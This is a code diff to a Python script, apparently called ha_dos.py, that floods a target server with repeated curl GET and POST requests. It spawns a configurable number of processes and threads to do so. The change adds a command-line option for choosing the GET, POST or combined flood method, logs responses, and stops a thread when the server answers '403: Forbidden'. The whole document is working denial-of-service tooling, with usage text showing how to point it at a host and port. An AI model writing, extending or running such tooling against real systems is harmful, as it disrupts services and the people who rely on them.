@@ -40,8 +40,9 @@ def dos_get(host):
     while True:
         curl_output = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
         response = curl_output.stdout.decode()
-        if response == "":
-            print("Fail to send GET request")
+        print("response:", response)
+        if response == "" or response == "403: Forbidden":
+            print("Fail to sent GET request")
             break
         else:
             print("GET Request sent successfully")
@@ -61,23 +62,35 @@ def dos_post(host, flow_id):
     while True:
         curl_output = subprocess.run(["curl", "-d", data, host, "-s"], stdout=subprocess.PIPE)
         response = curl_output.stdout.decode()
-        if "Failed" in response or response == "":
+        print("response:", response)
+        if "Failed" in response or response == "" or response == "403: Forbidden":
             print("Fail to send POST request")
             break
         else:
             print("POST Request sent successfully")
 
 # Combine GET and POST requests attack.
-def dos_attack(host, flow_id):
-    # Starting DOS attack using GET requests
-    threading.Thread(target=dos_get, args=(host,)).start()
-    threading.Thread(target=dos_get, args=(host,)).start()
+def dos_attack(host, flow_id, dos_method):
+    if dos_method == 0:
+        # Starting DOS attack using GET requests
+        threading.Thread(target=dos_get, args=(host,)).start()
+        threading.Thread(target=dos_get, args=(host,)).start()
 
-    # Starting DOS attack using POST requests
-    threading.Thread(target=dos_post, args=(host, flow_id)).start()
+        # Starting DOS attack using POST requests
+        threading.Thread(target=dos_post, args=(host, flow_id)).start()
+    elif dos_method == 1:
+        # Starting DOS attack using GET requests
+        for i in range(4):
+            threading.Thread(target=dos_get, args=(host,)).start()
+    elif dos_method == 2:
+        # Starting DOS attack using POST requests
+        threading.Thread(target=dos_post, args=(host, flow_id)).start()
+        threading.Thread(target=dos_post, args=(host, flow_id)).start()
+
 
 def process_arguments():
     host = ""
+    dos_method = 0
     num_of_dos = 20
     args = sys.argv
     for i in range(1, len(args)):
@@ -85,16 +98,20 @@ def process_arguments():
             host = args[i+1]
         elif args[i] == "-d":
             num_of_dos = int(args[i+1])
+        elif args[i] == "-m":
+            dos_method = int(args[i+1])
+
 
     if len(args) == 1:
         print("Options:")
         print("\t-s: Specify the server's address with port number.")
         print("\t    If port is not provided, the port will be selected appropriately according to the protocol (i.e. HTTP vs HTTPS).")
         print("\t-d: Specify the number of concurrent DOS attack processes. The default is 20.")
-        print("\nExample: python ha_dos.py -s 192.168.1.1:8080 -d 20")
+        print("\t-m: Specify DOS attack method. 1 is for GET, 2 is for POST, and 0 is for both. Default is 0.")
+        print("\nExample: python ha_dos.py -s 192.168.1.1:8080 -d 20 -m 1")
         return None
 
-    return host, num_of_dos
+    return host, num_of_dos, dos_method
 
 def main():
     arguments = process_arguments()
@@ -102,9 +119,10 @@ def main():
         exit()
     host = arguments[0]
     num_of_dos = arguments[1]
+    dos_method = arguments[2]
     flow_id = get_flow_id(host)
     for i in range(num_of_dos):
-        multiprocessing.Process(target=dos_attack, args=(host, flow_id)).start()
+        multiprocessing.Process(target=dos_attack, args=(host, flow_id, dos_method)).start()
 
 
 if __name__ == "__main__":
